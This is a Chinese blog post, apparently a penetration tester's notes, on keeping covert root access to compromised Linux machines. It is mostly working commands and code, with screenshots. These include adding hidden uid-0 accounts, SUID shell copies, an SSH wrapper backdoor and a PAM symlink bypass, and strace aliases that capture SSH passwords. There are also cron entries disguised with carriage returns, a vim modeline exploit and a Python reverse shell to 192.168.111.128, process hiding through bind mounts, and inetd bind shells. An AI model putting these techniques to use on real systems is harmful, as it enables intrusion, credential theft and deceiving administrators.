---
title: "linux权限维持"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# linux权限维持

### 修改文件、终端属性

#### 文件创建时间

有时我们会根据文件修改时间来判断文件是否为后门，比如对比shell.php和index.php的修改时间是否相差过大

touch命令用于修改文件或者目录的时间属性，可以使用touch修改文件创建时间：

~~~shell
touch -r index.php shell.php
# 将shell.php的修改时间改为和index.php一致
~~~

![image-20241126212023666](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212025017-463283678.png)

#### 文件锁定

在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，而此权限用ls -l是查看不出来的，从而达到隐藏权限的目的：

~~~shell
chattr +i evil.php  #锁定文件
rm -rf evil.php     #直接删除会提示禁止删除

lsattr  evil.php    #属性查看
chattr -i evil.php  #解除锁定
rm -rf evil.php     #此时才可以正常删除文件
~~~

![image-20241126212501296](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212502426-793342345.png)

#### 历史操作命令

我们可能想不让在shell中执行的命令被记录在命令行历史中，但单纯的`history -c  `只能清除全部命令记录，可以尝试下面的方法

##### 针对你的工作关闭历史记录

可以临时禁用历史功能，这意味着在这命令之后执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中：

~~~shell
[space]set +o history
#[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录
~~~

执行了目标命令后记得恢复：

~~~shell
[Space]set -o history  
#将环境恢复原状
~~~

可以看看下面这个情况：

![image-20241126213946978](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126213948268-983788722.png)

上图利用这个方法使`echo 2nd`的命令记录没有被存储在history中

#####  历史记录中删除指定的命令

如果目标命令已经存在于历史，可以对其进行删除：

* 找到想要删除的关键命令：

  ~~~shell
  history | grep "keyword"
  ~~~

  ![image-20241126214456252](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214457282-2004294411.png)

* 上面查询得到了对应命令记录的id，接下来进行删除：

  ~~~shell
  history -d [num]
  ~~~

  ![image-20241126214956966](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214958158-1537806554.png)

  虽然这样删除了历史记录，但我上面执行的命令也被记录了，所以我个人认为上面关闭历史记录的方法更有效

### 添加用户

默认已经提升至root权限

#### passwd写入

root权限时，我们可以直接通过写入passwd文件进行用户写入

/etc/passwd 各部分含义：

~~~
⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL
~~~

![image-20241126223641041](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126223642368-1367413835.png)

可以根据这个格式增加超级用户：

* 首先构造一个Yuy0ung用户的身份信息：

  ~~~shell
  openssl passwd -1 -salt Yuy0ung Yuy0ung
  //-1为MD5加密算法，-salt指定盐值，后面为密码
  ~~~

  构造出来：

  ~~~
  Yuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:0:0:hack:/root:/bin/bash
  ~~~

* 写入/etc/passwd:

  ~~~shell
  echo 'Yuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:0:0:hack:/root:/bin/bash' >> /etc/passwd
  ~~~

添加后即可直接登录yuy0ung用户

##### 如果系统不允许uid=0的用户远程登录

直接添加普通用户：

~~~ shell
echo 'Yuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:-1:-1:-1:-1:-1:-1:500' >> /etc/shadow
~~~

##### 如果可以允许uid=0远程登录：

增加超级用户：

~~~shell
echo yuy0ung:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级⽤户账号
passwd yuy0ung #修改yuy0ung的密码
~~~

##### 不交互无回显添加Linux密码

* 第一种，添加root权限用户:

  ~~~shell
  useradd hacker -u 0 -o -g root -G root|| echo "123456" | passwd --stdin hacker #创建账户hacker、密码123456且为root权限
  ~~~

  ![image-20241127120043062](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127120044711-904935737.png)

* 第二种，创建普通用户：

  ~~~shell
  useradd test || echo "123456" | passwd --stdin test
  ~~~

  ![image-20241127120533807](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127120536131-1916933809.png)

  这种方法的用户权限很小

* 第三种，也是创建root用户，只是设置密码的方式不同：

  ~~~shell
  useradd -u 0 -o -g root -G root test2 || echo -e "1qazwsx2wsx\n1qazwsx2wsx"|passwd test2
  ~~~

  ![image-20241127121050400](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127121052371-777897794.png)

### suid后门

（需要root权限留后门）

用来权限提升的后门，其实就是创建了一个能用于suid提权的利用点，这里以/bin/bash为例：

~~~shell
cp /bin/bash /tmp/.mybash
# 将bash复制

chmod 4755 /tmp/.mybash
# 赋予suid权限
~~~

利用也很简单,就是suid提权的步骤 ：

~~~shell
/tmp/.mybash -p
~~~

![image-20241127122027484](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127122029475-2034687517.png)

### SSH后门

#### SSH wrapper

判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中：

~~~shell
cd /usr/sbin/
mv sshd ../bin/

echo '#!/usr/bin/perl' >sshd
# 创建一个新的sshd文件

echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
# 4A是13377的小端模式，模式匹配会启动一个新的shell

echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
# 执行时调用真正的sshd程序

chmod u+x sshd

/etc/init.d/ssh restart
# 或
systemctl restart sshd
# 重启SSH守护进程服务
~~~

![image-20241127212050144](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127212051712-211947944.png)

连接时在本机执行：

~~~shell
socat STDIO TCP4:192.168.111.145:22,sourceport=13377
~~~

即可连接并获取shell：

![image-20241127212132755](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241127212133773-1480381265.png)

这里的原理很巧妙：

init 首先启动的是 /usr/sbin/sshd ,脚本执行到 getpeername 这里的时候，正则匹配会失败，于是执行下一句，启动 /usr/bin/sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp 连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 /usr/sbin/sshd ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是 13377 就执行sh创建一个shell

优点：

* 在未连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。
* 在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录

#### SSH 软连接后门

优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录

配置：

~~~shell
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=8080
~~~

![image-20241128213448909](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128213449753-1183703138.png)

连接：

~~~shell
ssh root@[ip] -p 8080
~~~

我这里尝试并不成功，不知道是不是linux版本原因

####  SSH 公钥免密登陆

老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景

* 在自己主机生成密钥：

  ~~~shell
  ssh-keygen -b 4096 -t rsa  #直接三个回车
  ~~~

  ![image-20241128224552342](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128224553936-1086514457.png)

* 查看生成的公钥内容：

  ![image-20241128224644487](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128224646044-499679776.png)

  复制这个内容

* 在目标主机写公钥：

  ~~~shell
  echo "你自己的密钥内容">>/root/.ssh/authorized_keys
  
  #编辑完成后还得修改权限
  chmod 600 ~/.ssh/authorized_keys    
  chmod 700 ~/.ssh
  ~~~

  ![image-20241128225034898](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128225035899-352880271.png)

* 接下来就可以免密连接：

  ~~~shell
  ssh -i /root/.ssh/id_rsa root@目标ip
  ~~~

  ![image-20241128230337482](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241128230338673-1273744881.png)

#### SSH Keylogger记录密码

当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。

在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码

~~~shell
alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
~~~

![image-20241129170758166](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129170800169-1003344408.png)

尝试连接：

~~~shell
ssh kali@192.168.111.128
~~~

![image-20241129172939658](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129172941870-330434312.png)

可以看见只要ssh连接，就会在/tmp中生成log文件：

![image-20241129173110197](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129173112278-482136561.png)

读取密码：

~~~shell
grep "read(4" /tmp/.sshpwd-29Nov111732872501.log | tail -n 20
# 根据不同环境自行调试响应行数
~~~

![image-20241129173450474](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129173452343-992246258.png)

可以看见输入了密码为kali

#### strace监听ssh来源流量

不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码

首先目标机开启监听：

~~~shell
ps -ef | grep sshd	# 获取父进程PID
strace -f -p 1015510 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048
~~~

然后等待别人连入：

![image-20241129175237666](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129175239828-1243548610.png)

连入后监听端会有流量：

![image-20241129175318050](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129175320508-1239492397.png)

接下来可以查看log文件：

~~~shell
grep "read(6" /tmp/.ssh.log | tail -n 20
~~~

![image-20241129174957267](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129174959876-1199405219.png)

这里可以看见连接密码为kali，这样就获取到了本机密码

### cron后门

cron嘛，都知道是用来做定时任务的

一般的定时任务后门大概这样部署：

~~~shell
(crontab -l;echo '*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i')|crontab -
~~~

但是这样的话，使用`crontab -l 就会被发现`，不够隐蔽：
![image-20241129181834340](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129181836580-298457946.png)

那么我们可以使用如下命令：

~~~shell
(crontab -l;printf "*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
~~~

![image-20241129181959312](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129182001365-2039736802.png)

这时候管理员如果执行 `crontab -l` 就会看到显示"no crontab for root"，但这个回显其实是我们自己构造的，实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容：

~~~
/var/spool/cron/crontabs/root
~~~

通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，接下来也有这个的利用

### cat隐藏

上面记录了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中，比如在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚

cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令

那么可以用python生成带有换行符的内容sh：

~~~python
cmd_h = "echo 'You forgot to check `cat -A`!'"  # hidden
cmd_v = "echo 'Hello world!'"                          # visible

with open("test.sh", "w") as f:
    output = "#!/bin/sh\n"
    output += cmd_h + ";" + cmd_v + " #\r" + cmd_v + " " * (len(cmd_h) + 3) + "\n"
    f.write(output)
~~~

生成出来一个test.sh，赋予一下权限:

![image-20241129210026396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210028723-1328256524.png)

如果我们使用cat来读取：

![image-20241129210123679](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210126066-1097461210.png)

看见的就只是hello world，但如果我们尝试执行就会发现异常：

![image-20241129210331598](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129210333907-1289640909.png)

很明显这个脚本是不止执行了上面的hello world的，这里需要用`cat -A`或者编辑器来查看文件：

![image-20241129213359711](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129213402667-2072716227.png)

可以看见其实有隐藏内容的

### vim后门

#### vim modeline(CVE-2019-12735)

影响版本：

>Vim < 8.1.1365
>Neovim < 0.3.6

当 vim 打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置，vim默认关闭modeline

vim开启/usr/share/vim/vimrc：

~~~shell
# 文件内写入
set modeline
~~~

当前目录创建文件：

~~~shell
echo ':!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > poc.txt
# 这里命令以uname -a为例

vim poc.txt
~~~

在vim查看hello.txt时就会自动执行uname -a，反弹shell同理：

~~~shell
:!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9999 >/tmp/f||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
~~~

#### vim python 扩展后门

适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统

先查看是否安装python扩展

~~~shell
vim --version
~~~

![image-20241129221249786](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129221252642-1706353464.png)

ok有python3，接下来编写脚本：

~~~python
import socket, subprocess, os;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("192.168.111.128", 6666));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
p = subprocess.call(["/bin/bash", "-i"]);
~~~

接下来攻击机开启监听：

![image-20241129221929097](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129221931725-126875695.png)

目标主机执行命令：

-E是启动一个改进的Ex模式（也就是命令模式），-c是去加载一个文件，并去执行，这样我们的反弹shell脚本会执行

~~~shell
vim -E -c "py3file shell.py"
~~~

![image-20241129222137517](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241129222140035-1166127872.png)

可以看见shell反弹成功

但是现在后门太明显了，netstat -anpt 一查就可以看到，而且 vim -E -c “py3file shell.py” 命令执行之后，还会有一个空白窗口，我们需要尝试隐藏

那么我们可以执行如下命令：

命令可以在目标机上不开启窗口回显并且会自动删除脚本

~~~shell
(nohup vim -E -c "py3file shell.py"> /dev/null 2>&1 &) && sleep 2 && rm -f shell.py
#将nohup的执行结果输出到/dev/null中
#其中/dev/null在linux中代表空设备，结果输出到空设备也就是丢弃nohup的执行结果。
#“2”在linux中代表错误输出，“1”在linux中代表标准输出，在此处也就是nohup的输出。2>&1表示将错误输出绑定到标准输出上，在此处也就是将错误输出同样输出到空设备上不进行显示。这样，无论nohup执行结果是否正确，都不会有输出。
~~~

接下来隐藏可疑的连接：

~~~shell
mkdir null
mount --bind null /proc/6238
netstat -anpt
#mount --bind命令是将前一个目录挂载到后一个目录上，所有对后一个目录的访问其实都是对前一个目录的访问，并且会将前一个目录路径隐藏起来（注意这里只是隐藏不是删除，数据未发生改变，仅仅是无法访问了）。
~~~

### inetd服务后门

inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门

~~~shell
#修改/etc/inetd.conf
vim /etc/inetd.conf

#discard stream tcp nowait root internal 
#discard dgram udp wait root internal 
daytime stream tcp nowait root /bin/bash bash -i

#开启inetd
inetd
~~~

![image-20241202171059182](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171101390-349138686.png)

攻击机正向连接即可获得shell：

~~~shell
#nc连接
nc -vv 192.168.111.145 13
~~~

![image-20241202171119389](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171121698-2101423426.png)

~~~shell
#可以配合suid后门，修改/etc/services文件：
suidshell 6666/tcp
#然后修改/etc/inetd.conf
suidshell stream tcp nowait root /bin/bash bash -i
#可以修改成一些常见的端口，以实现隐藏
~~~

![image-20241202171533457](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202171535658-674212828.png)

同样直接正向连接即可：

~~~shell
nc -vv 192.168.111.145 6666
~~~

![image-20241202174429933](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241202174433254-116180685.png)

成功连接

后面是一些没时间复现的打法了，暂时CV过来的，看看就好

### 协议后门

在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。

#### ICMP

主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: https://zhuanlan.zhihu.com/p/41154036

开源工具：ICMP后门项目地址：https://github.com/andreafabrizi/prism

#### DNS

在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：[通过DNS传输后门来绕过杀软](https://www.anquanke.com/post/id/85431)

开源工具：DNS后门项目地址：https://github.com/DamonMohammadbagher/NativePayload_DNS

协议后门检测：对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接

清除：kill进程、删除文件即可

### PAM后门

PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。

PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open

上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。

利用步骤：复制patch到源代码目录 >>> 打patch >>> 编译 >>> 将生成的pam_uninx.so文件覆盖到/lib/secruity/pam_unix.so下 >>> 修改文件属性 >>> 建立密码保存文件，并设置好相关的权限 >>> 清理日志 >>> ok

~~~sh
#确保ssh开启pam支持
vim /etc/ssh/sshd_config
UsePAM yes

#自动化脚本
https://github.com/litsand/shell/blob/master/pam.sh
~~~

### 进程注入

从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有 ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace 系统调用允许一个进程去调试另外一个进程。

GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件

```delphi
Copy$./inject [-n process-name] [-p pid] [library-to-inject]
./inject -n sample-target sample-library.so
```

清除：kill或者重启对应的进程即可

还有 cymothoa ：https://github.com/jorik041/cymothoa

### Rootkit

rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix

Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件

检测：使用相关检测工具，比如：unhide
